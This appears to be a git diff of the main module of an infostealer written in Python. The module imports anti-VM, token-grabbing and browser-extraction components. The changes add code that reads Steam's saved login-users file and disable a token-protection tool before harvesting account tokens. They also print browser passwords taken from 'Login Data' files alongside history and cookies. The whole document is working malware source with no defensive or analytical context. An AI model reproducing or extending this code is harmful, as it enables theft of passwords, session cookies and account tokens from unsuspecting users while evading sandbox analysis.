@@ -1,12 +1,12 @@
-from core import extractor
-from core import antivm
-from core import sysinfo
-from core import tokengrabber
-
-from threading import Thread
-
 import os
 import sys
+
+from core.lib import vdfParser
+
+from core.componets import extractor
+from core.componets import antivm
+from core.componets import sysinfo
+from core.componets import tokengrabber
 
 class Main:
     def __init__(self) -> None:
@@ -34,7 +34,8 @@ class Main:
                     passwds = extraction.extractPasswords(os.path.join(browser, profile, "Login Data"))
                     history = extraction.extractHistory(os.path.join(browser, profile, "History"))
                     cookies = extraction.extractCookies(os.path.join(browser, profile))
-                    
+
+                    print(passwds)
 
         for key in extractor.browsers:
             browser = extractor.browsers[key]
@@ -47,12 +48,18 @@ class Main:
 
 
     def steam(self):
-        pass
+        steamUsers = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "loginusers.vdf"))
+
+        if os.path.exists(steamUsers):
+            with open(steamUsers, "r") as f:
+                usersConfig = vdfParser.convert(f.read())
+            
+            return usersConfig
 
     def token(self):
+        extractor.Anti_tokenprotector.killprotector()
         tokens = tokengrabber.extract_tokens().tokens
         print(tokens)
-        extractor.Anti_tokenprotector.killprotector()
 
     def run(self):
         antivm.Antivm.run()
